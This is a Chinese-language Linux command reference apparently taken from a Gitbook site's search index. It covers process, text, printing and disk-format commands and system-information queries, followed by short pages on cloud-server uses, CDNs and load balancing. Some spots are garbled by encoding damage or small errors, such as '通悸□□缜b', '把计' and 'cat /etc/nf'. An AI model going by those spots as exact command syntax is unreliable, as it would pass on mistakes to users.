使用权限：所有使用者 　使用方式：ps [options] [--help] 　说明：显示瞬间行程 (process) 的动态 　参数： 　ps 的参数非常多, 在此仅列出几个常用的参数并大略介绍含义 　-A 列出所有的行程 　-w 显示加宽可以显示较多的资讯 　-au 显示较详细的资讯 　-aux 显示所有包含其他使用者的行程 　au(x) 输出格式: 　USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND 　USER: 行程拥有者 　PID: pid 　%CPU: 占用的 CPU 使用率 　%MEM: 占用的记忆体使用率 　VSZ: 占用的虚拟记忆体大小 　RSS: 占用的记忆体大小 　TTY: 终端的次要装置号码 (minor device number of tty) 　STAT: 该行程的状态: 　D: 不可中断的静止 (通悸□□缜b进行 I/O 动作) 　R: 正在执行中 　S: 静止状态 　T: 暂停执行 　Z: 不存在但暂时无法消除 　W: 没有足够的记忆体分页可分配 　　指令名称：pstree 　使用权限：所有使用者 　使用方式： 　pstree [-a] [-c] [-h|-Hpid] [-l] [-n] [-p] [-u] [-G|-U] [pid|user] 　pstree -V 　说明：将所有行程以树状图显示, 树状图将会以 pid (如果有指定) 或是以 init 这个基本行程为根 (root) ,如果有指定使用者 id , 则树状图会只显示该使用者所拥有的行程 　参数： 　-a 显示该行程的完整指令及参数, 如果是被记忆体置换出去的行程则会加上括号 　-c 如果有重覆的行程名, 则分开列出 (预设值是会在前面加上 * 　指令名称：renice 　使用权限：所有使用者 　使用方式：renice priority [[-p] pid ...] [[-g] pgrp ...] [[-u] user ...] 　说明：重新指定一个或多个行程(Process)的优先序(一个或多个将根据所下的参数而定) 　把计: 　-p pid 重新指定行程的 id 为 pid 的行程的优先序 　-g pgrp 重新指定行程群组(process group)的 id 为 pgrp 的行程 (一个或多个) 的优先序 　-u user 重新指定行程拥有者为 user 的行程的优先序 　范例： 　将行程 id 为 987 及 32 的行程与行程拥有者为 daemon 及 root 的优先序号码加 1: 　renice +1 987 -u daemon root -p 32 　注意:每一个行程(Process)都有一个唯一的 (unique) id 　指令名称：top 　使用权限：所有使用者 　使用方式：top [-] [d delay] [q] [c] [S] [s] [i] [n] [b] 　说明：即时显示 process 的动态 　把计: 　d:改变显示的更新速度,或是在交谈式指令列( interactive command)按 s 　q:没有任何延迟的显示速度,如果使用者是有 superuser 的权限,则 top 将会以最高的优先序执行 　c:切换显示模式,共有两种模式,一是只显示执行档的名称,另一种是显示完整的路径与名称S:累积模式,会将己完成或消失的子行程 ( dead child process ) 的 CPU time 累积起来 　s:安全模式,将交谈式指令取消, 避免潜在的危机 　i:不显示任何闲置 (idle) 或无用 (zombie) 的行程 　n:更新的次数,完成后将会退出 top 　b:批次档模式,搭配 \"n\" 参数一起使用,可以用来将 top 的结果输出到档案内 　范例： 　显示更新十次后退出 ; 　top -n 10 　使用者将不能利用交谈式指令来对行程下命令: 　top -s 　将更新显示二次的结果输入到名称为 top.log 的档案里: 　top -n 2 -b 　指令名称：skill 　 使用权限：所有使用者 　使用方式： skill [signal to send] [options] 选择程序的规则 　说明： 　送个讯号给正在执行的程序,预设的讯息为 TERM (中断) , 较常使用的讯息为 HUP , INT , KILL , STOP , CONT ,和 0 　讯息有三种写法:分别为 -9 , -SIGKILL , -KILL , 可以使用 -l 或 -L 已列出可使用的讯息。 　一般参数： 　-f 快速模式/尚未完成 　-i 互动模式/ 每个动作将要被确认 　-v 详细输出/ 列出所选择程序的资讯 　-w 智能警告讯息/ 尚未完成 　-n 没有动作/ 显示程序代号 　参数：选择程序的规则可以是, 终端机代号,使用者名称,程序代号,命令名称。 　-t 终端机代号 ( tty 或 pty ) 　-u 使用者名称 　-p 程序代号 ( pid ) 　-c 命令名称 可使用的讯号: 　以下列出已知的讯号名称,讯号代号,功能。 　名称 (代号) 功能/ 描述 　ALRM 14 离开 　HUP 1 离开 　INT 2 离开 　KILL 9 离开/ 强迫关闭 　PIPE 13 离开 　POLL 离开 　PROF 离开 　TERM 15 离开 　USR1 离开 　USR2 离开 　VTALRM 离开 　STKFLT 离开/ 只适用于i386, m68k, arm 和 ppc 硬体 　UNUSED 离开/ 只适用于i386, m68k, arm 和 ppc 硬体 　TSTP 停止 /产生与内容相关的行为 　TTIN 停止 /产生与内容相关的行为 　TTOU 停止 /产生与内容相关的行为 　STOP 停止 /强迫关闭 　CONT 从新启动 /如果在停止状态则从新启动,否则忽略 　PWR 忽略 /在某些系统中会离开 　WINCH 忽略 　CHLD 忽略 　ABRT 6 核心 　FPE 8 核心 　ILL 4 核心 　QUIT 3 核心 　SEGV 11 核心 　TRAP 5 核心 　SYS 核心 /或许尚未实作 　EMT 核心 /或许尚未实作 　BUS 核心 /核心失败 　XCPU 核心 /核心失败 　XFSZ 核心 /核心失败 　范例： 　停止所有在 PTY 装置上的程序 　skill -KILL -v pts/* 　停止三个使用者 user1 , user2 , user3 　skill -STOP user1 user2 user3 　其他相关的命令: kill 　**指令名称：expr** 　使用权限：所有使用者 字串长度 　shell>> expr length \"this is a test\" 　14 数字商数 　shell>> expr 14 % 9 　5 从位置处抓取字串 　shell>> expr substr \"this is a test\" 3 5 　is is 数字串 only the first character 　shell>> expr index \"testforthegame\" e 　2 字串真实重现 　shell>> expr quote thisisatestformela 　thisisatestformela 　指令名称: tr 1.比方说要把目录下所有的大写档名换为小写档名 似乎有很多方式,\"tr\"是其中一种: 　#!/bin/sh 　dir=\"/tmp/testdir\"; 　files=`find $dir -type f`; 　for i in $files 　do 　dir_name=`dirname $i`; 　ori_filename=`basename $i` 　new_filename=`echo $ori_filename | tr [:upper:] [:lower:]` > /dev/null; 　#echo $new_filename; 　mv $dir_name/$ori_filename $dir_name/$new_filename 　done 2.自己试验中...lowercase to uppercase 　tr abcdef...[del] ABCDE...[del] 　tr a-z A-Z 　tr [:lower:] [:upper:] 　shell>> echo \"this is a test\" | tr a-z A-Z > www 　shell>> cat www 　THIS IS A TEST 3.去掉不想要的字串 　shell>> tr -d this ### 去掉有关 t.e.s.t 　this 　man 　man 　test 　e 4.取代字串 　shell>> tr -s \"this\" \"TEST\" 　this 　TEST 　th 　TE 　指令：clear 　用途：清除屏幕文字。 　使用方法：在 console 上输入 clear。 　指令名称: reset, tset 　 使用方法: tset [-IQqrs] [-] [-e ch] [-i ch] [-k ch] [-m mapping] [terminal] 　使用说明: 　reset 其实和 tset 是一同个命令,它的用途是设定终端机的状态。一般而言,这个命令会自动的从环境变数,命令列或是其它的组态档决定目前终端机的型态。如果指定型态是 ? 的话,这个程式会要求使用者输入终端机的型别。 　由于这个程式会将终端机设回原始的状态,除了在 login 时使用外,当系统终端机因为程式不正常执行而进入一些奇怪的状态时,你也可以用它来重设终端机o 例如不小心把二进位档用 cat 指令进到终端机,常会有终端机不再回应键盘输入,或是回应一些奇怪字元的问题。此时就可以用 reset 将终端机回复至原始状态。选项说明: 　-p 　将终端机类别显示在萤幕上,但不做设定的动作。这个命令可以用来取得目前终端机的类别。 　-e ch 　将 erase 字元设成 ch 　-i ch 　将中断字元设成 ch 　-k ch 　将删除一行的字元设成 ch 　-I 　不要做设定的动作,如果没有使用选项 -Q 的话,erase,中断及删除字元的目前值依然会送到萤幕上。 　-Q 　不要显示 erase,中断及删除字元的值到萤幕上。 　-r 　将终端机类别印在萤幕上。 　-s 　将设定 TERM 用的命令用字串的型式送到终端机中,通常在 .login 或 .profile 中用 　范例: 　让使用者输入一个终端机型别并将终端机设到该型别的预设状态。 reset ? 　将 erase 字元设定 control-h reset -e ^B 　将设定用的字串显示在萤幕上 reset -s 　Erase is control-B (^B). 　Kill is control-U (^U). 　Interrupt is control-C (^C). 　TERM=xterm; 　指令名称：compress 　 使用权限：所有使用者 　使用方式：compress [-dfvcV] [-b maxbits] [file ...] 　说明： 　compress 是一个相当古老的 unix 档案压缩指令,压缩后的档案会加上一个 .Z 延伸档名以区别未压缩的档案,压缩后的档案可以以 uncompress 解压。若要将数个档案压成一个压缩档,必须先将档案 tar 起来再压缩。由于 gzip 可以产生更理想的压缩比例,一般人多已改用 gzip 为档案压缩工具。 　参数： 　c 输出结果至标准输出设备（一般指荧幕） 　f 强迫写入档案,若目的档已经存在,则会被覆盖 (force) 　v 将程式执行的讯息印在荧幕上 (verbose) 　b 设定共同字串数的上限,以位元计算,可以设定的值为 9 至 16 bits 。由于值越大,能使用的共同字串就 越多,压缩比例就越大,所以一般使用预设值 16 bits (bits) 　d 将压缩档解压缩 　V 列出版本讯息 　范例： 　将 source.dat 压缩成 source.dat.Z ,若 source.dat.Z 已经存在,内容则会被压缩档覆盖。 　compress -f source.dat 　将 source.dat 压缩成 source.dat.Z ,并列印出压缩比例。 　-v 与 -f 可以一起使用 　compress -vf source.dat 　将压缩后的资料输出后再导入 target.dat.Z 可以改变压缩档名。 　compress -c source.dat > target.dat.Z 　-b 的值越大,压缩比例就越大,范围是 9-16 ,预设值是 16 。 　compress -b 12 source.dat 　将 source.dat.Z 解压成 source.dat ,若档案已经存在,使用者按 y 以确定覆盖档案,若使用 -df 程式则会自动覆盖档案。由于系统会自动加入 .Z 为延伸档名,所以 source.dat 会自动当作 source.dat.Z 处理。 　compress -d source.dat 　compress -d source.dat.Z 　指令名称： lpd 　 使用权限： 所有使用者 　使用方式：lpd [-l] [#port] 　lpd 是一个常驻的印表机管理程式,它会根据 /etc/printcap 的内容来管理本地或远端的印表机。/etc/printcap 中定义的每一个印表机必须在 /var/lpd 中有一个相对应的目录,目录中以 cf 开头的档案表示一个等待送到适当装置的印表工作。这个档案通常是由 lpr 所产生。 　lpr 和 lpd 组成了一个可以离线工作的系统,当你使用 lpr 时,印表机不需要能立即可用,甚至不用存在。lpd 会自动监视印表机的状况,当印表机上线后,便立即将档案送交处理。这个得所有的应用程式不必等待印表机完成前一工作。 　参数： 　-l: 将一些除错讯息显示在标准输出上。 　#port: 一般而言,lpd 会使用 getservbyname 取得适当的 TCP/IP port,你可以使用这个参数强迫 lpd 使用指定的 port。 　范例： 　这个程式通常是由 /etc/rc.d 中的程式在系统启始阶段执行。 　**指令名称 lpq** 　-- 显示列表机贮列中未完成的工作 用法 　lpq [l] [P] [user] 　说明 　lpq 会显示由 lpd 所管理的列表机贮列中未完成的项目。 　范例 　范例 1. 显示所有在 lp 列表机贮列中的工作 lpq -PlpRank Owner Job Files Total Size1st root 238 (standard input) 1428646 bytes 　相关函数 　lpr,lpc,lpd 　指令名称： lpr 　使用权限： 所有使用者 　使用方式：lpr [ -P printer ] 　将档案或是由标准输入送进来的资料送到印表机贮列之中,印表机管理程式 lpd 会在稍后将这个档案送给适当的程式或装置处理。lpr 可以用来将料资送给本地或是远端的主机来处理。参数： 　-p Printer: 将资料送至指定的印表机 Printer,预设值为 lp。 　范例： 　将 www.c 和 kkk.c 送到印表机 lp。 　lpr -Plp www.c kkk.c 　指令名称: lprm 　-- 将一个工作由印表机贮列中移除 用法 　/usr/bin/lprm [P] [file...] 　说明 　尚未完成的印表机工作会被放在印表机贮列之中,这个命令可用来将常未送到印表机的工作取消。由于每一个印表机都有一个独立的贮列,你可以用 -P 这个命令设定想要作用的印列机。如果没有设定的话,会使用系统预设的印表机。 　这个命令会检查使用者是否有足够的权限删除指定的档案,一般而言,只有档案的拥有者或是系统管理员才有这个权限。 　范例 　将印表机 hpprinter 中的第 1123 号工作移除 　lprm -Phpprinter 1123 　将第 1011 号工作由预设印表机中移除 　lprm 1011 　指令名称： fdformat 　 使用权限： 所有使用者 　使用方式：fdformat [-n] device 　使用说明: 　对指定的软碟机装置进行低阶格式化。使用这个指令对软碟格式化的时候,最好指定像是下面的装置： 　/dev/fd0d360 磁碟机 A: ,磁片为 360KB 磁碟 　/dev/fd0h1440 磁碟机 A: ,磁片为 1.4MB 磁碟 　/dev/fd1h1200 磁碟机 B: ,磁片为 1.2MB 磁碟 　如果使用像是 /dev/fd0 之类的装置,如果里面的磁碟不是标准容量,格式化可能会失败。在这种情况之下,使用者可以用 setfdprm 指令先行指定必要参数。 　参数： 　-n 关闭确认功能。这个选项会关闭格式化之后的确认步骤。 　范例： 　fdformat -n /dev/fd0h1440 　将磁碟机 A 的磁片格式化成 1.4MB 的磁片。并且省略确认的步骤。 　指令名称： mformat 　 使用权限： 所有使用者 　使用方式： 　mformat [-t cylinders] [-h heads] [-s sectors] [-l volume_label] [-F] [-I fsVer-sion] [-S sizecode] [-2 sectors_on_track_0] [-M software_sector_size] [-a] [-X] [-C] [-H hidden_sectors] [-r root_sectors] [-B boot_sector] [-0 rate_on_track_0] [-A rate_on_other_tracks] [-1] [-k] drive: 　在已经做过低阶格式化的磁片上建立 DOS 档案系统。如果在编译 mtools 的时候把 USE_2M 的参数打开,部分与 2M 格式相关的参数就会发生作用。否则这些参数（像是 S,2,1,M）不会发生作用。 　参数： 　-t 磁柱（synlider）数 　-h 磁头（head）数 　-s 每一磁轨的磁区数 　-l 标签 　-F 将磁碟格式化为 FAT32 格式,不过这个参数还在实验中。 　-I 设定 FAT32 中的版本号。这当然也还在实验中。 　-S 磁区大小代码,计算方式为 sector = 2^(大小代码+7) 　-c 磁丛（cluster）的磁区数。如果所给定的数字会导致磁丛数超过 FAT 表的限制,mformat 会自动放大磁区数。 　-s 　-M 软体磁区大小。这个数字就是系统回报的磁区大小。通常是和实际的大小相同。 　-a 如果加上这个参数,mformat 会产生一组 Atari 系统的序号给这块软碟。 　-X 将软碟格式化成 XDF 格式。使用前必须先用 xdfcopy 指令对软碟作低阶格式化的动作。 　-C 产生一个可以安装 MS-DOS 档案系统的磁碟影像档（disk image）。当然对一个实体磁碟机下这个参数是没有意义的。 　-H 隐藏磁区的数目。这通常适用在格式化硬碟的分割区时,因为通常一个分割区的前面还有分割表。这个参数未经测试,能不用就不用。 　-n 磁碟序号 　-r 根目录的大小,单位是磁区数。这个参数只对 FAT12 和 FAT16 有效。 　-B 使用所指定的档案或是设备的开机磁区做为这片磁片或分割区的开机磁区。当然当中的硬体参数会随之更动。 　-k 尽量保持原有的开机磁区。 　-0 第 0 轨的资料传输率 　-A 第 0 轨以外的资料传输率 　-2 使用 2m 格式 　-1 不使用 2m 格式 　范例： 　mformat a: 　这样会用预设值把 a: （就是 /dev/fd0）里的磁碟片格式化。 指令mkdosfs 　 使用权限： 所有使用者 　使用方式： mkdosfs [ -c | -l filename ] 　[ -f number_of_FATs ] 　[ -F FAT_size ] 　[ -i volume_id ] 　[ -m message_file ] 　[ -n volume_name ] 　[ -r root_dir_entry ] 　[ -s sector_per_cluster ] 　[ -v ] 　device 　[ block_count ] 　说明： 建立 DOS 档案系统。 device 指你想要建立 DOS 档案系统的装置代号。像是 /dev/hda1 等等。 block_count 则是你希望配置的区块数。如果 block_count 没有指定则系统会自动替你计算符合该装置大小的区块数。 　参数： 　-c 建立档案系统之前先检查是否有坏轨。 　-l 从得定的档案中读取坏轨记录。 　-f 指定档案配置表（FAT , File Allocation Table）的数量。预设值为 2 。目前 Linux 的 FAT 档案系统不支援超过 2 个 FAT 表。通常这个不需要改。 　-F 指定 FAT 表的大小,通常是 12 或是 16 个位元组。12 位元组通常用于磁碟片,16 位元组用于一般硬碟的分割区,也就是所谓的 FAT16 格式。这个值通常系统会自己选定适当的值。在磁碟片上用 FAT16 通常不会发生作用,反之在硬碟上用 FAT12 亦然。 　-i 指定 Volume ID。一般是一个 4 个位元组的数字,像是 2e203a47 。如果不给系统会自己产生。 　-m 当使用者试图用这片磁片或是分割区开机,而上面没有作业系统时,系统会给使用者一段警告讯息。这个参数就是用来变更这个讯息的。你可以先用档案编辑好,然后用这个参数指定,或是用 　-m - 　这样系统会要求你直接输入这段文字。要特别注意的是,档案里的字串长度不要超过 418 个字,包括展开的跳栏符号（TAB）和换行符号（换行符号在 DOS 底下算两个字元！） 　-n 指定 Volume Name,就是磁碟标签。如同在 DOS 底下的 format 指令一样,给不给都可以。没有预设值。 　-r 指定根目录底下的最大档案数。这里所谓的档案数包括目录。预设值是在软碟上是 112 或是 224 ,在硬碟上是 512。没事不要改这个数字。 　-s 每一个磁丛（cluster）的磁区数。必须是 2 的次方数。不过除非你知道你在作什么,这个值不要乱给。 　-v 提供额外的讯息 　范例： 　mkdosfs -n Tester /dev/fd0 将 A 槽里的磁碟片格式化为 DOS 格式,并将标签设为 Tester 查看linux的内核版本 uname -a； more /etc/issue; cat /proc/version; 查看软件的版本信息 查看apache的版本信息，如果是通过yum，或者是rpm安装的，可以使用 rpm -qa |grep httpd 还可以通过httpd -v来查询； 查看apache的版本信息，如果是通过yum，或者是rpm安装的，可以使用 rpm -qa |grep httpd 来查看； 还可以通过httpd -v来查询； 查看php的版本信息，如果是通过yum，或者是rpm包安装的，可以使用rpm -qa |grep php来查看； 同样，也可以使用php -v 来查看php的版本信息； 查看mysql的版本信息，如果是通过yum安装的，或者是rpm包安装的，可以使用rpm -qa |grep mysql 来查看； 也可以使用mysql -v 或者是--help|grep Distrib来查看； 也可以进入mysql，然后通过命令select version();或者是status;命令查看。 Linux查看CPU、内存、版本等系统信息 一：查看CPU 　　more /proc/cpuinfo | grep \"model name\" 　　grep \"model name\" /proc/cpuinfo 　　如果觉得需要看的更加舒服 　　grep \"model name\" /proc/cpuinfo | cut -f2 -d: 　　怎么样，linux的命令就要这样熟悉。 二：查看内存 grep MemTotal /proc/meminfo grep MemTotal /proc/meminfo | cut -f2 -d: free -m |grep \"Mem\" | awk '{print $2}' 三：查看cpu是32位还是64位 　　查看CPU位数(32 or 64) 　　# getconf LONG_BIT 　　# echo $HOSTTYPE 　　# uname -a 四：查看当前linux的版本 　　# more /etc/RedHat-release 　　# cat /etc/redhat-release 五：查看内核版本 # uname -r # uname -a 六：查看当前时间 　　date 七：查看硬盘和分区 df -h fdisk -l 也可以查看分区 du -sh 可以看到全部占用的空间 du /etc -sh 可以看到这个目录的大小 　　 八：查看安装的软件包 查看系统安装的时候装的软件包 　　cat -n /root/install.log 　　more /root/install.log | wc -l 查看现在已经安装了那些软件包 　　rpm -qa 　　rpm -qa | wc -l 　　yum list installed | wc -l 　　不过很奇怪，我通过rpm，和yum这两种方式查询的安装软件包，数量并不一样。没有找到原因。 九：查看键盘布局 　　cat /etc/sysconfig/keyboard 　　cat /etc/sysconfig/keyboard | grep KEYTABLE | cut -f2 -d= 十：查看selinux情况 sestatus sestatus | cut -f2 -d: cat /etc/sysconfig/selinux 十一：查看ip，mac地址 　在ifcfg-eth0 文件里你可以看到mac，网关等信息。 　　ifconfig 　　cat /etc/sysconfig/network-scripts/ifcfg-eth0 | grep IPADDR 　　cat /etc/sysconfig/network-scripts/ifcfg-eth0 | grep IPADDR | cut -f2 -d= 　　ifconfig eth0 |grep \"inet addr:\" |awk '{print $2}'|cut -c 6- 　　ifconfig | grep 'inet addr:'| grep -v '127.0.0.1' | cut -d: -f2 | awk '{ print $1}' 　　查看网关 　　cat /etc/sysconfig/network 　　查看dns 　　cat /etc/nf 十二：查看默认语言 echo $LANG $LANGUAGE cat /etc/sysconfig/i18n 十三：查看所属时区和是否使用UTC时间 cat /etc/sysconfig/clock 十四：查看主机名 hostname cat /etc/sysconfig/network 修改主机名就是修改这个文件，同时最好也把host文件也修改 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/linux-basis/Cloud-Server-What-todo.html":{"url":"doc/linux-basis/Cloud-Server-What-todo.html","title":"拥有一台云服务器能干嘛","keywords":"","body":"买了一台云服务器能干嘛 一、搭建博客 目前已经有CSDN、博客园这些可以发表文章的网站，但是自由度不高，受限制 可以自己部署一个个人网站，灵活性高，想怎么玩就怎么玩。 如何搭建自己的网站？这里写写2种方案 ①自己开发 前端（HTML+css+js/vue）+后端（Django+Flask）+数据库（MySQL+Redis）+Linux知识——从代码、本地测试、上线到运维。 ②服务器采用Linux+LNMP，或者直接使用可视化的宝塔软件，代码框架WordPress+主题（Kratos） 二、内网穿透 frp 是一个高性能的反向代理应用，可以帮助您轻松地进行内网穿透，对外网提供服务，支持 tcp, http, https 等协议类型，并且 web 服务支持根据域名进行路由转发。 frp 的作用 利用处于内网或防火墙后的机器，对外网环境提供 http 或 https 服务。 对于 http 服务支持基于域名的虚拟主机，支持自定义域名绑定，使多个域名可以共用一个80端口。 利用处于内网或防火墙后的机器，对外网环境提供 tcp 服务，例如在家里通过 ssh 访问处于公司内网环境内的主机。 可查看通过代理的所有 http 请求和响应的详细信息。（待开发） 三、搭建一个文件系统 百度云——下载速度慢 用自己的服务器搭建一个文件系统，跑自己的带宽不会限速 上传- 下载- Python写脚本，指定的文件或者目录自动上传到百度云 四、爬虫 用Python写的脚本——丢服务器上自己运行 ——将爬好的文件下载下来 模拟（贴吧）签到、爬小说、爬美女图片 百度广告联盟-js：爬人们比较喜欢 大众喜欢的，如美女图10万张，搭建一个美女网站，在网站中嵌入百度广告，用户点击之后百度就会给你钱 五、学习Linux命令 shell命令 vim命令 六、APP服务端 写APP的服务端，给自用的APP提供网络服务 用Java、PHP、Python写后端api接口 前后端分离技术 vue+Django+MySQL 七、机器人 微信机器人：WeChat-py，登录你的微信，定时发消息，如每天给女友说早安、晚安，以及可以实现自动回复的功能 QQ机器人：Python写程序，控制一个QQ账号去群里发信息 八、CPS推广 通过搭建CPS推广平台，推广京东、淘宝、拼多多的商品，赚取CPS佣金等。比如领劵。 CPS推广——对接淘宝客系统 服务器怎么用？ 1、需要掌握基本知识：Linux知识，上传、下载、安装环境、把本地程序上传到服务器上。 2、会用相关软件：ftp、xshell Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/linux-basis/cdn.html":{"url":"doc/linux-basis/cdn.html","title":"一文读懂CDN和CDN实现的原理","keywords":"","body":"一文读懂CDN和CDN实现的原理 什么是CDN 百度百科CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。CDN的关键技术主要有内容存储和分发技术。 CDN简单的来说就是存储一些静态文件的一台或多台服务器，通过复制，缓存等方式，将文件保存其中。 如果没有CDN会怎么样？ 图片各种加载不出来，视频总在加载，淘宝无法下单、直播卡顿、优酷爱奇艺转圈圈等 CDN会加速什么文件？ css，html，jpg，png，apk，mp4等媒体都属于静态文件，也就是说用户发送的请求不会影响静态文件的内容， 而jsp，php等文件就不属于静态文件，因为他们的内容会因我们的请求而发生改变（回源）。 CDN如何实现加速？ 通常情况下，我们所要的数据都是从主服务器中获取，但假如我们的主服务器在南方，而访问用户在北方，那么访问速度就会相对变慢，变慢的原因有很多，例如传输距离，运营商，带宽等等因素，而使用CDN技术的话，我们会将CDN节点分布在各地，当用户发送请求到达服务器时，服务器会根据用户的区域信息，为用户分配最近的CDN服务器。 可以把CDN看成主服务器在各地开的分店。例如大型的连锁超市，在深圳的用户就到最近的深圳节点去获取静态资源，北京就去北京节点获取文件 CDN数据从哪里来？ 复制，缓存，CDN服务器可以在用户请求后缓存文件，也可以主动抓取主服务器内容。 CDN优点 远程加速：远程访问用户根据DNS负载均衡技术智能自动选择Cache服务器，选择最快的Cache服务器，加快远程访问的速度。 镜像服务：消除了不同运营商之间互联的瓶颈造成的影响，实现了跨运营商的网络加速，保证不同网络中的用户都能得到良好的访问质量。镜像功能可以解决不同运营商之间无法互通的问题 本地Cache加速：提高了企业站点（尤其含有大量图片和静态页面站点）的访问速度，并大大提高以上性质站点的稳定性。 缓解源服务器压力：CDN可以实现远程镜像Cache服务器，远程用户访问时可以直接从Cache上读取数据，这样不仅可以减少服务器本身流量的消耗，对带宽不会有很多的压力。 带宽优化：自动生成服务器的远程Mirror（镜像）cache服务器，远程用户访问时从cache服务器上读取数据，减少远程访问的带宽、分担网络流量、减轻原站点WEB服务器负载等功能。 集群抗攻击：广泛分布的CDN节点加上节点之间的智能冗余机制，可以有效地预防黑客入侵以及降低各种D.D.o.S攻击对网站的影响，同时保证较好的服务质量 。 安全性：由于不同的访客访问的是不同的缓存服务器中的内容，所以隐藏了源服务器的真实IP，使源服务器不容易收到攻击。 CDN缺点 费用成本增加 CDN的实施是非常复制的，工程比较庞大，建议客户选择一些技术好，口配好的提供商。如果小的CDN运营商不仅不会加速还会起到反作用。 会影响SEO（由于CDN的镜像功能，有可能同一个IP下出现了很多网站，导致网站的权重分散），可忽略。 对开发者影响：有时源服务器文件已修改，但是通过浏览器（清理浏览器缓存）依然看到的是未更新的文件。 避免CDN文件缓存的方法 1.在静态资源URL链接后加参数 2.刷新链接：在后台更新目标URL(阿里云CDN后台、CDN服务商提供刷新接口) 3.域名绑定hosts到源服务器IP，绕过CDN。 CDN工作原理 传统访问过程 由上图可见，用户访问未使用CDN缓存网站的过程为: 1.用户输入访问的域名,操作系统向 LocalDns 查询域名的ip地址. 2.LocalDns向 ROOT DNS 查询域名的授权服务器(这里假设LocalDns缓存过期) 3.ROOT DNS将域名授权dns记录回应给 LocalDns 4.LocalDns得到域名的授权dns记录后,继续向域名授权dns查询域名的ip地址 5.域名授权dns 查询域名记录后，回应给 LocalDns 6.LocalDns 将得到的域名ip地址，回应给 用户端 7.用户得到域名ip地址后，访问站点服务器 8.站点服务器应答请求，将内容返回给客户端. CDN访问过程 通过上图，我们可以了解到，使用了CDN缓存后的网站的访问过程变为： 1.用户输入访问的域名,操作系统向 LocalDns 查询域名的ip地址. 2.LocalDns向 ROOT DNS 查询域名的授权服务器(这里假设LocalDns缓存过期) 3.ROOT DNS将域名授权dns记录回应给 LocalDns 4.LocalDns得到域名的授权dns记录后,继续向域名授权dns查询域名的ip地址 5.域名授权dns 查询域名记录后(一般是CNAME)，回应给 LocalDns 6.LocalDns 得到域名记录后,向智能调度DNS查询域名的ip地址 7.智能调度DNS 根据一定的算法和策略(比如静态拓扑，容量等),将最适合的CDN节点ip地址回应给 LocalDns 8.LocalDns 将得到的域名ip地址，回应给 用户端 9.用户得到域名ip地址后，访问站点服务器 10.CDN节点服务器应答请求，将内容返回给客户端.(缓存服务器一方面在本地进行保存，以备以后使用，二方面把获取的数据返回给客户端，完成数据服务过程) 通过以上的分析我们可以得到，为了实现对普通用户透明(使用缓存后用户客户端无需进行任何设置)访问，需要使用DNS(域名解析)来引导用户来访问Cache服务器，以实现透明的加速服务. 由于用户访问网站的第一步就是域名解析,所以通过修改dns来引导用户访问是最简单有效的方式. 名词解释 DNS DNS即Domain Name System，是域名解析服务的意思。它在互联网的作用是：把域名转换成为网络可以识别的ip地址。人们习惯记忆域名，但机器间互相只认IP地址，域名与IP地址之间是一一对应的，它们之间的转换工作称为域名解析，域名解析需要由专门的域名解析服务器来完成，整个过程是自动进行的。比如：上网时输入的www.baidu.com会自动转换成为220.181.112.143。 常见的DNS解析服务商有：阿里云解析，万网解析，DNSPod，新网解析，Route53（AWS），Dyn，Cloudflare等。 CNAME记录（CNAME record） CNAME即别名( Canonical Name )；可以用来把一个域名解析到另一个域名，当 DNS 系统在查询 CNAME 左面的名称的时候，都会转向 CNAME 右面的名称再进行查询，一直追踪到最后的 PTR 或 A 名称，成功查询后才会做出回应，否则失败。 例如，你有一台服务器上存放了很多资料，你使用docs.example.com去访问这些资源，但又希望通过documents.example.com也能访问到这些资源，那么你就可以在您的DNS解析服务商添加一条CNAME记录，将documents.example.com指向docs.example.com，添加该条CNAME记录后，所有访问documents.example.com的请求都会被转到docs.example.com，获得相同的内容。 CNAME域名 接入CDN时，在CDN提供商控制台添加完加速域名后，您会得到一个CDN给您分配的CNAME域名， 您需要在您的DNS解析服务商添加CNAME记录，将自己的加速域名指向这个CNAME域名，这样该域名所有的请求才会都将转向CDN的节点，达到加速效果。 回源host 回源host：回源host决定回源请求访问到源站上的具体某个站点。 例子1：源站是域名源站为www.a.com,回源host为www.b.com,那么实际回源是请求到www.a.com解析到的IP,对应的主机上的站点www.b.com 例子2：源站是IP源站为1.1.1.1, 回源host为www.b.com,那么实际回源的是1.1.1.1对应的主机上的站点www.b.com 协议回源 指回源时使用的协议和客户端访问资源时的协议保持一致，即如果客户端使用 HTTPS 方式请求资源，当CDN节点上未缓存该资源时，节点会使用相同的 HTTPS 方式回源获取资源；同理如果客户端使用 HTTP 协议的请求，CDN节点回源时也使用HTTP协议。 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/linux-basis/负载均衡和CDN技术.html":{"url":"doc/linux-basis/负载均衡和CDN技术.html","title":"负载均衡和CDN技术","keywords":"","body":"负载均衡和CDN技术 曾经见到知乎上有人问“为什么像facebook这类的网站需要上千个工程师维护？” 下面的回答多种多样，但总结起来就是：一个高性能的web系统需要从无数个角度去考虑他，大到服务器的布局，小到软件中某个文件的实现，甚至于某个循环内的运算如果出现不严谨都可能导致全盘崩溃。 上面提到web性能优化需要多个角度去考虑，我们无法考虑到所有的优化细节，但可以从我们已知的层面去优化，我们就先从网络层面说起。 ①网络请求路径: （客户端输入URL定位符）→（DNS服务器寻找映射）→（进入服务器，处理数据）→（返回数据至客户端）　 在这个用例中我们可以很清晰的看出网络请求到返回的过程，虽然非常抽象，但足够我们以他为基础来进行优化了。 1）负载均衡 BOSS一次给了小明好多项任务，小明发现怎么安排时间也做不完，于是乎他盯上了在旁边偷偷看电影的小强，小强突然觉得背后有一股凉气，一回头小明一脸坏笑看着他 “这几个任务交给你，晚上请你吃饭，要不然…嘿嘿嘿”，小强虽然不情愿，但是在小明的请求（要挟）下，只能服从。 第二天，小明顺利的完成了任务，给小强买了袋辣条。 在计算机上负载均衡也类似如此，我们的大BOSS客户端将请求发送至服务器，然而一台服务器是无法承受很高的并发量的，我们就会将请求转发到其他服务器。 当然真正的负载均衡架构并不是由一台server转发的另一台server，而在客户端与服务器端中间加入了一个负责分配请求的负载均衡硬件（软件）。 DNS 